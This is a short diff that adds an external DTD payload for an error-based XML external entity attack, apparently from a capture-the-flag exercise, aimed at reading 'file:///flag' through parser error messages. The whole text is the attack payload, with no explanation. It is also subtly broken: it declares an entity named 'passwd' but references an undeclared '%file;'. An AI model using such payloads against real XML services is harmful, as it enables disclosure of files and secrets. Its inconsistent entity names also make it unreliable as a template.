@@ -1,0 +1,4 @@
+<!ENTITY % passwd SYSTEM "file:///flag">
+<!ENTITY % notvalid "<!ENTITY &#x25; test SYSTEM 'file:///invalid/%file;'>">
+%notvalid;
+%test;
